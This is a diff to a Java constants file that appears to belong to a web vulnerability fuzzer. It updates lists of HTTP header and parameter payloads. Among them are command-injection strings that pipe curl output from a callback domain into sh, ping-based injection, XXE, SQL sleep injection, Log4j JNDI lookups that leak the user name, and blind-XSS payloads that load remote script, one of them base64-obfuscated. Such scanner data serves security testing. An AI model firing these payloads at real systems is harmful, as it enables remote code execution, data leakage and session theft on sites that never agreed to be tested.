@@ -31,19 +31,24 @@ public class PayloadConstants {
      * Header模糊测试专用的payload列表
      */
     public static final List<PayloadInfo> HEADER_PAYLOAD_INFOS = Arrays.asList(
-            new PayloadInfo("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999", "999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999"),
+//            new PayloadInfo("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999", "99999"),
             new PayloadInfo("//etc/shells", "//etc/shells"),
             new PayloadInfo("$(env)", "$(env)"),
-            new PayloadInfo("{fuzz}.ssrf.abga5.wi11.fun", "{hash}.ssrf.abga5.wi11.fun"),
+            new PayloadInfo("{fuzz}.ssrf.tejq8.zcyy.fun", "{hash}.ssrf.tejq8.zcyy.fun"),
             new PayloadInfo("null", "null"),
-            new PayloadInfo("'`curl$IFS@{fuzz}.cmdi1.abga5.wi11.fun|sh`'$(curl$IFS@{fuzz}.cmdi1.abga5.wi11.fun|sh)", "'`curl$IFS@{hash}.cmdi1.abga5.wi11.fun|sh`'$(curl$IFS@{hash}.cmdi1.abga5.wi11.fun|sh)"),
-            new PayloadInfo("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [!ENTITY delay SYSTEM \"http://httpbin.org/delay/7\"]><root>&delay;</root>", "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [!ENTITY delay SYSTEM \"http://httpbin.org/delay/7\"]><root>&delay;</root>"),
-            new PayloadInfo(");?/%ff'\"><img/src=http://ig{fuzz}.abga5.wi11.fun>", ");?/%ff'\"><img/src=http://ig{hash}.abga5.wi11.fun>"),
-            new PayloadInfo("&ping -c 4 {fuzz}.cmdi2.abga5.wi11.fun&'\"`0&ping -c 4 {fuzz}.cmdi2.abga5.wi11.fun&`'", "&ping -c 4 {hash}.cmdi2.abga5.wi11.fun&'\"`0&ping -c 4 {hash}.cmdi2.abga5.wi11.fun&`'"),
-            new PayloadInfo("1' OR /*!sleep*/(LENGTH('{fuzz}hb')); -- ", "1' OR /*!sleep*/(LENGTH('{hash}hb')); -- "),
+            new PayloadInfo("'`curl$IFS@{fuzz}.cmdi1.tejq8.zcyy.fun|sh`'$(curl$IFS@{fuzz}.cmdi1.tejq8.zcyy.fun|sh)", "cmdi curl"),
+            new PayloadInfo("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [!ENTITY delay SYSTEM \"http://httpbin.org/delay/7\"]><root>&delay;</root>", "xml delay 7"),
+            new PayloadInfo(");?/%ff'\"><img/src=http://ig{fuzz}.tejq8.zcyy.fun>", ");?/%ff'\"><img>"),
+            new PayloadInfo("<link rel=\"stylesheet\" href=\"https://{hash}.lnk.tejq8.zcyy.fun/link.css\">", "<link>"),
+            new PayloadInfo("&ping -c 4 {fuzz}.cmdi2.tejq8.zcyy.fun&'\"`0&ping -c 4 {fuzz}.cmdi2.tejq8.zcyy.fun&`'", "cmdi ping"),
+            new PayloadInfo("1' OR /*!sleep*/(LENGTH('{fuzz}hb')); -- ", "1' OR /*!sleep*/"),
             new PayloadInfo("1' OR 1/0; -- ", "1' OR 1/0; -- "),
-            new PayloadInfo("chaxx123'\">*/*/=end'''\"\"\"[${$(`;\\abcc8d: g00f%0d%0ac9w: g00s%c4%8d%c4%8av5m: f00Java", "chaxx123'\">*/*/=end'''\"\"\"[${$(`;\\abcc8d: g00f%0d%0ac9w: g00s%c4%8d%c4%8av5m: f00Java"),
-            new PayloadInfo("${j${main:\\k5:-Nd}i${spring:k5:-:}ldap://${sys:user.name}-{fuzz}.l4j.abga5.wi11.fun/}", "${j${main:\\k5:-Nd}i${spring:k5:-:}ldap://${sys:user.name}-{hash}.l4j.abga5.wi11.fun/}")
+            new PayloadInfo("chaxx123'\">*/*/=end'''\"\"\"[${$(`;\\abcc8d: g00f%0d%0ac9w: g00s%c4%8d%c4%8av5m: f00Java", "chaxx + crlf"),
+            new PayloadInfo("${j${main:\\k5:-Nd}i${spring:k5:-:}ldap://${sys:user.name}-{fuzz}.l4j.tejq8.zcyy.fun/}", "log4j-v"),
+            new PayloadInfo("${jdni:ldap://x.{hash}.l4j.tejq8.zcyy.fun/a}", "log4j-v2"),
+            new PayloadInfo("\"><script src=\"https://js.rip/nm\"></script>", "bxss1"),
+            new PayloadInfo("\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL25tIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>", "bxss2")
+
     );
 
     /**
@@ -52,8 +57,10 @@ public class PayloadConstants {
      */
     public static final List<PayloadInfo> PARAM_PAYLOAD_INFOS = Arrays.asList(
             new PayloadInfo("chaxx123", "chaxx"),
+            new PayloadInfo("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999", "99999"),
             new PayloadInfo("null", "null"),
             new PayloadInfo("null", "\"null\""),
+            new PayloadInfo("\\r\\n", "\\r\\n"),
             new PayloadInfo("", "empty"),
             new PayloadInfo("%", "%"),
             new PayloadInfo("%00", "%00"),
